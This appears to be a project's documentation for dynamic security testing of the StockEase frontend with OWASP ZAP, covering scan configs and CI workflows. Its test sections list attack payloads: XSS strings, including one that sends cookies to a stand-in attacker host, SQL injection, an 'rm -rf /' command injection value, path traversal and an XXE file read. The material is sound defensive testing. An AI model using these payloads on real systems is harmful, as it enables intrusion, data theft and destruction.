# Dynamic Application Security Testing (DAST)

**Version:** 1.0.0  
**Last Updated:** 2024  
**Status:** Active

## Overview

Dynamic Application Security Testing (DAST) is a black-box testing methodology that evaluates the running application to identify runtime vulnerabilities, misconfigurations, and security weaknesses. The StockEase Frontend uses **OWASP ZAP** (Zed Attack Proxy) to perform automated security scanning against preview and production environments.

## Table of Contents

1. [DAST Architecture](#dast-architecture)
2. [OWASP ZAP Setup](#owasp-zap-setup)
3. [Scan Configuration](#scan-configuration)
4. [Security Testing Scenarios](#security-testing-scenarios)
5. [API Security Testing](#api-security-testing)
6. [Vulnerability Categories](#vulnerability-categories)
7. [Reporting & Remediation](#reporting--remediation)
8. [Integration with CI/CD](#integration-with-cicd)

## DAST Architecture

### Testing Flow

```
Source Code
    ↓
Build & Deploy (Preview Environment)
    ↓
OWASP ZAP Initialization
    ├─ Spider (Discover endpoints)
    ├─ Active Scan (Attack endpoints)
    └─ API Scan (Test APIs)
    ↓
Vulnerability Detection
    ├─ Injection Attacks
    ├─ XSS Detection
    ├─ Security Header Analysis
    ├─ Authentication Testing
    └─ Configuration Review
    ↓
Report Generation
    ├─ High Risk Issues
    ├─ Medium Risk Issues
    └─ Low Risk / Informational
    ↓
Remediation & Verification
```

### Environments

| Environment | Purpose | Trigger | Scan Type |
|-------------|---------|---------|-----------|
| **Preview** | Pull request validation | On PR creation | Rapid baseline scan |
| **Staging** | Integration & UAT | Post-merge | Full comprehensive scan |
| **Production** | Continuous monitoring | Scheduled daily | Focused on changes |

## OWASP ZAP Setup

### Installation

#### Local Development

```bash
# macOS (Homebrew)
brew install zaproxy

# Linux (apt)
sudo apt-get install zaproxy

# Docker (Recommended for CI/CD)
docker pull owasp/zap2docker-stable
```

#### Docker Setup

```yaml
# docker-compose.yml
version: '3.8'
services:
  zap:
    image: owasp/zap2docker-stable
    ports:
      - "8080:8080"
    environment:
      - ZAP_OPTS="-config api.disablekey=true"
    volumes:
      - ./zap-reports:/zap/reports
      - ./zap-scripts:/zap/scripts
    command: zap.sh -cmd -quickurl http://app:3000 -quickout /zap/reports/report.html
```

### API Configuration

**ZAP REST API** runs on `http://localhost:8080`:

```bash
# Check ZAP status
curl http://localhost:8080/JSON/core/action/status

# Get scan status
curl http://localhost:8080/JSON/ascan/view/status

# Stop ZAP
curl http://localhost:8080/JSON/core/action/shutdown
```

## Scan Configuration

### 1. Baseline Scan (Preview Environment)

**Purpose:** Quick security validation on pull requests (5-10 minutes)

**Configuration:**
```javascript
// zap-scan-baseline.js
const http = require('http');

const zapConfig = {
  hostname: 'localhost',
  port: 8080,
  path: '/JSON/ascan/action/scan',
  method: 'POST',
};

const params = {
  url: process.env.PREVIEW_URL || 'http://localhost:3000',
  inScopeOnly: false,
  recurse: true,
  scanPolicyName: 'Light',
};

function zapRequest(action, data) {
  return new Promise((resolve, reject) => {
    const options = { ...zapConfig, path: `/JSON/ascan/action/${action}` };
    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => resolve(JSON.parse(body)));
    });
    req.on('error', reject);
    req.write(JSON.stringify(data));
    req.end();
  });
}

// Start baseline scan
async function runBaseline() {
  console.log('Starting ZAP baseline scan...');
  try {
    const result = await zapRequest('scan', params);
    console.log('Scan ID:', result.scan);
    
    // Wait for completion
    let status = 0;
    while (status < 100) {
      const progress = await zapRequest('scanProgress', { scanId: result.scan });
      status = progress.scanProgress[0].percentComplete;
      console.log(`Progress: ${status}%`);
      await new Promise(r => setTimeout(r, 5000));
    }
    
    console.log('Baseline scan completed');
    process.exit(0);
  } catch (error) {
    console.error('Scan failed:', error);
    process.exit(1);
  }
}

runBaseline();
```

**Scan Rules:**
- Spider depth: 2 (limit scope)
- Scan policy: Light (basic checks)
- Timeout: 10 minutes
- Parallel scanning: 4 threads

---

### 2. Full Scan (Staging Environment)

**Purpose:** Comprehensive security assessment post-merge (30-45 minutes)

**Configuration:**
```javascript
// zap-scan-full.js
const zapConfig = {
  url: process.env.STAGING_URL || 'http://staging.stockease.local',
  scanPolicy: 'Standard',
  recurse: true,
  inScopeOnly: true,
  spiderDepth: 5,
  ajaxSpider: true, // For React apps
  timeout: 2400, // 40 minutes
};

// Included endpoints
const scope = [
  '/api/auth/**',
  '/api/products/**',
  '/dashboard',
  '/search',
];

// Excluded endpoints (non-sensitive)
const excluded = [
  '/api/public/**',
  '/health',
  '/metrics',
  '*.png',
  '*.jpg',
  '*.css',
  '*.js',
];
```

**Scan Rules Enabled:**
- Cross-Site Scripting (XSS)
- SQL Injection
- CSRF Detection
- Broken Authentication
- Security Misconfiguration
- Sensitive Data Exposure
- Using Components with Known Vulnerabilities
- Broken Access Control
- Weak Authentication

---

### 3. API-Specific Scan

**Purpose:** Test REST API endpoints directly

**Configuration:**
```yaml
# zap-api-scan.yaml
targetUrl: http://localhost:3000
apiDefinitionFile: ./api-definition.yaml

apiScan:
  # Authentication for API
  headers:
    Authorization: "Bearer ${TEST_JWT_TOKEN}"
  
  # API endpoints to scan
  endpoints:
    - /api/auth/login
    - /api/auth/refresh
    - /api/auth/logout
    - /api/products
    - /api/products/{id}
    - /api/products/{id}/edit
    - /api/products/{id}/delete

  # Parameter fuzzing
  parameters:
    - name: id
      type: integer
      values: [1, 99999, "' OR '1'='1"]
    
    - name: q
      type: string
      values: ["test", "<script>alert(1)</script>", "'; DROP TABLE users;--"]

  # Method-specific rules
  methods:
    GET:
      testParameters: true
      testHeaders: true
    
    POST:
      testCsrf: true
      testPayloads: true
    
    DELETE:
      testAuthentication: true
      testAuthorization: true
```

---

## Security Testing Scenarios

### 1. Authentication Testing

**Objectives:**
- Verify authentication is required
- Test token validation
- Check session management
- Validate logout functionality

**Test Cases:**
```javascript
// zap-auth-tests.js
const authTests = [
  {
    name: 'Unauthorized Access',
    request: 'GET /api/products',
    headers: {},
    expectedStatus: 401,
  },
  {
    name: 'Invalid Token',
    request: 'GET /api/products',
    headers: { 'Authorization': 'Bearer invalid_token_12345' },
    expectedStatus: 401,
  },
  {
    name: 'Expired Token',
    request: 'GET /api/products',
    headers: { 'Authorization': 'Bearer ' + expiredToken },
    expectedStatus: 401,
  },
  {
    name: 'Token Reuse After Logout',
    request: 'GET /api/products',
    headers: { 'Authorization': 'Bearer ' + loggedOutToken },
    expectedStatus: 401,
  },
  {
    name: 'Session Hijacking',
    request: 'POST /api/products',
    headers: { 'Authorization': 'Bearer ' + anotherUsersToken },
    body: { name: 'Malicious Product' },
    expectedStatus: 403,
  },
];
```

---

### 2. XSS Testing

**Objectives:**
- Detect reflected XSS vulnerabilities
- Identify DOM-based XSS risks
- Verify input sanitization

**Test Payloads:**
```javascript
const xssPayloads = [
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  '<svg onload="alert(1)">',
  '<img src=x onerror="alert(1)">',
  '<iframe src="javascript:alert(1)">',
  '<body onload="alert(1)">',
  '"><script>fetch("https://attacker.com?c=" + document.cookie)</script>',
  'javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  '<input onfocus="alert(1)" autofocus>',
];

// ZAP automatically tests these payloads in:
// - Query parameters
// - Form fields
// - Headers
// - Request body
```

---

### 3. CSRF Testing

**Objectives:**
- Verify CSRF protection is implemented
- Test token validation
- Check SameSite cookie attributes

**Test Cases:**
```javascript
const csrfTests = [
  {
    name: 'POST without CSRF Token',
    method: 'POST',
    url: '/api/products',
    headers: {
      'Content-Type': 'application/json',
      // No CSRF token
    },
    body: { name: 'New Product' },
    expectedStatus: 403,
  },
  {
    name: 'POST with Invalid CSRF Token',
    method: 'POST',
    url: '/api/products',
    headers: {
      'X-CSRF-Token': 'invalid_token_abc123',
    },
    body: { name: 'New Product' },
    expectedStatus: 403,
  },
  {
    name: 'Form CSRF without Token',
    method: 'POST',
    url: '/api/products',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'name=NewProduct',
    expectedStatus: 403,
  },
];
```

---

### 4. Authorization Testing

**Objectives:**
- Verify access controls are enforced
- Test horizontal privilege escalation
- Check vertical privilege escalation

**Test Cases:**
```javascript
const authzTests = [
  {
    name: 'IDOR: Accessing Another User\'s Product',
    token: userAToken,
    request: 'GET /api/products/user123-product456',
    expectedStatus: 403,
  },
  {
    name: 'IDOR: Editing Another User\'s Product',
    token: userAToken,
    method: 'PUT',
    url: '/api/products/otheruser-productid',
    body: { price: 1 },
    expectedStatus: 403,
  },
  {
    name: 'Privilege Escalation: Admin from User',
    token: regularUserToken,
    request: 'GET /api/admin/dashboard',
    expectedStatus: 403,
  },
  {
    name: 'Privilege Escalation: Modifying Role',
    token: regularUserToken,
    method: 'PUT',
    url: '/api/users/me',
    body: { role: 'admin' },
    expectedStatus: 403,
  },
];
```

---

### 5. API Input Validation

**Objectives:**
- Test parameter fuzzing
- Verify input constraints
- Check data type validation

**Test Payloads:**
```javascript
const inputTests = {
  // Oversized inputs
  longString: 'a'.repeat(10000),
  
  // SQL injection patterns
  sqlInjection: "' OR '1'='1",
  sqlComment: "admin'--",
  
  // Command injection
  commandInjection: '; rm -rf /',
  
  // Path traversal
  pathTraversal: '../../../etc/passwd',
  
  // XML injection
  xmlInjection: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
  
  // Null bytes
  nullByte: 'test\x00.txt',
  
  // Type confusion
  intAsString: 'abc' + 123,
  arrayAsString: '[1,2,3]',
};
```

---

## API Security Testing

### REST API Scanning

**Define API scope in `zap-api-config.yaml`:**
```yaml
apiVersion: v1
kind: ZapApiScan
spec:
  url: http://localhost:3000/api
  
  # OpenAPI/Swagger definition
  apiDefinition: ./openapi.json
  
  # Custom headers for all requests
  defaultHeaders:
    Authorization: "Bearer ${AUTH_TOKEN}"
    X-API-Version: "v1"
  
  # Authentication flow
  authentication:
    type: bearer
    bearerToken: ${AUTH_TOKEN}
    refreshEndpoint: /api/auth/refresh
    refreshMethod: POST
  
  # Custom test scripts
  scripts:
    - name: test-authorization
      file: ./scripts/test-authorization.js
    - name: test-input-validation
      file: ./scripts/test-input-validation.js
```

### GraphQL API Scanning

```javascript
// zap-graphql-scan.js
const graphqlQueries = [
  // Introspection query
  `
    query {
      __schema {
        types {
          name
          fields {
            name
          }
        }
      }
    }
  `,
  
  // Test query with injection
  `
    query {
      user(id: "1' OR '1'='1") {
        id
        name
        email
      }
    }
  `,
  
  // Alias-based DoS
  `
    query {
      a: user(id: 1) { id }
      b: user(id: 1) { id }
      c: user(id: 1) { id }
      ... (repeat 1000 times)
    }
  `,
];
```

---

## Vulnerability Categories

### Critical Vulnerabilities

#### 1. **Injection Attacks** (OWASP A03:2021)

**What DAST Tests:**
- SQL injection in query parameters
- Command injection in API parameters
- XML/XXE injection in request body
- LDAP injection in search fields
- Expression Language injection

**Example Detection:**
```
POST /api/products?search=' OR '1'='1
Expected: Sanitized search results
Actual: All products returned (SQL injection confirmed)
```

---

#### 2. **Broken Authentication** (OWASP A07:2021)

**What DAST Tests:**
- Missing authentication on protected endpoints
- Weak token validation
- Session fixation vulnerabilities
- Logout ineffectiveness
- Account enumeration

**Example Detection:**
```
GET /api/admin/dashboard
Authorization: Bearer invalid_token
Expected: 401 Unauthorized
Actual: 200 OK (auth bypass confirmed)
```

---

#### 3. **Sensitive Data Exposure** (OWASP A02:2021)

**What DAST Tests:**
- Credentials in URLs or logs
- Sensitive data in responses
- Missing encryption (HTTP vs HTTPS)
- Weak TLS configuration
- Caching of sensitive responses

**Example Detection:**
```
GET /api/products
Response Headers:
  Cache-Control: max-age=3600
  Content: Authorization: Bearer sk_live_...

Finding: Sensitive token cached and exposed
Severity: Critical
```

---

#### 4. **XML External Entity Injection** (XXE)

**What DAST Tests:**
- File read attacks
- SSRF via XXE
- DoS via billion laughs

**Example Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>&xxe;</comment>
```

---

### Medium/High Vulnerabilities

#### 5. **Cross-Site Request Forgery** (OWASP A01:2021)

**What DAST Tests:**
- State-changing requests without CSRF tokens
- Token validation weaknesses
- Missing SameSite cookie attribute

---

#### 6. **Using Components with Known Vulnerabilities** (OWASP A06:2021)

**Detection Method:**
- DAST cannot detect this (requires SAST/SCA)
- Dependency scanning (npm audit, Snyk)
- GitHub vulnerability alerts

---

#### 7. **Broken Access Control** (OWASP A01:2021)

**What DAST Tests:**
- Direct Object Reference (IDOR)
- Function-level access control
- Horizontal privilege escalation
- Vertical privilege escalation

**Example:**
```
GET /api/users/1/orders -> User A's orders
GET /api/users/2/orders -> User B's orders (with User A token)
Expected: 403 Forbidden
Actual: 200 OK (IDOR confirmed)
```

---

## Reporting & Remediation

### ZAP Report Generation

```bash
# Generate HTML report
docker exec zap /zap/zap.sh -cmd \
  -quickurl http://app:3000 \
  -quickout /zap/reports/report.html

# Generate JSON report
docker exec zap /zap/zap.sh -cmd \
  -quickurl http://app:3000 \
  -quickout /zap/reports/report.json
```

### Report Format

The ZAP report includes:

```
Risk Level | Issue | Count | Severity | CWE | OWASP
-----------|-------|-------|----------|-----|-------
Critical   | Injection Attack | 2 | CRITICAL | CWE-89 | A03:2021
High       | Missing CSRF Protection | 1 | HIGH | CWE-352 | A01:2021
Medium     | Insecure Direct Object References | 3 | MEDIUM | CWE-639 | A01:2021
Low        | Missing Security Headers | 5 | LOW | - | A05:2021
```

### False Positive Management

```yaml
# zap-exclusions.yaml
falsePositives:
  - ruleId: 10000
    reason: "Test endpoint deliberately vulnerable"
    url: "/test/*"
  
  - ruleId: 10023
    reason: "Login form requires POST without CSRF for API"
    url: "/api/auth/login"
    comment: "CSRF token in Authorization header"
```

### Remediation Workflow

```
1. DAST Scan Complete
         ↓
2. Generate Report
         ↓
3. Review Findings
   ├─ Critical: Fix immediately
   ├─ High: Fix in next sprint
   └─ Medium/Low: Track in backlog
         ↓
4. Create Issues
   └─ Link to vulnerability type
         ↓
5. Fix & Test
   ├─ Implement fix
   ├─ Run unit tests
   └─ Verify with DAST
         ↓
6. Verify & Close
   └─ Confirm fix in next scan
```

---

## Integration with CI/CD

### GitHub Actions Workflow

```yaml
name: DAST Security Scan

on:
  pull_request:
    branches: [main, develop]
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM

jobs:
  dast:
    runs-on: ubuntu-latest
    services:
      app:
        image: stockease-frontend:pr-${{ github.event.number }}
        ports:
          - 3000:3000
      
      zap:
        image: owasp/zap2docker-stable
        ports:
          - 8080:8080
        options: |
          -e ZAP_OPTS="-config api.disablekey=true"

    steps:
      - uses: actions/checkout@v3
      
      - name: Wait for app to be ready
        run: |
          timeout 120 bash -c 'until curl -f http://localhost:3000; do sleep 5; done'
      
      - name: Run ZAP baseline scan
        run: |
          docker exec zap zap.sh -cmd \
            -quickurl http://app:3000 \
            -quickout /zap/reports/report.html
      
      - name: Upload DAST report
        uses: actions/upload-artifact@v3
        with:
          name: dast-report
          path: zap-reports/report.html
      
      - name: Comment on PR
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v6
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: '📊 DAST scan completed. [View report](https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }})'
            });
```

### Post-Merge Full Scan

```yaml
name: Full DAST Scan

on:
  push:
    branches: [main]

jobs:
  full-dast:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Deploy to staging
        run: ./scripts/deploy-staging.sh
      
      - name: Run full ZAP scan
        run: |
          docker run --rm \
            -v $(pwd)/zap-reports:/zap/reports \
            owasp/zap2docker-stable zap.sh -cmd \
            -config spider.maxDepth=5 \
            -config ascan.threadPerHost=4 \
            -quickurl https://staging.stockease.local \
            -quickout /zap/reports/full-report.html
      
      - name: Parse report for critical issues
        run: |
          python3 scripts/parse-zap-report.py \
            zap-reports/full-report.html \
            --fail-on-critical
      
      - name: Create GitHub issue if critical
        if: failure()
        uses: actions/github-script@v6
        with:
          script: |
            github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: '🚨 Critical security issue found in DAST scan',
              body: 'See attached DAST report',
            });
```

---

## Running DAST Scans Manually

```bash
# Start ZAP with preview app
docker-compose up -d

# Wait for app initialization
sleep 30

# Run baseline scan
npm run dast:baseline

# Run full scan on staging
npm run dast:full -- --url https://staging.stockease.local

# Generate report
npm run dast:report
```

## Related Documentation

- [Security Testing Strategy](strategy.md) - Overall testing approach
- [Static Analysis (SAST)](sast.md) - Code-level security testing
- [Security Checklists](../checklists/) - Manual security review

## Tools & Resources

- [OWASP ZAP](https://www.zaproxy.org/)
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
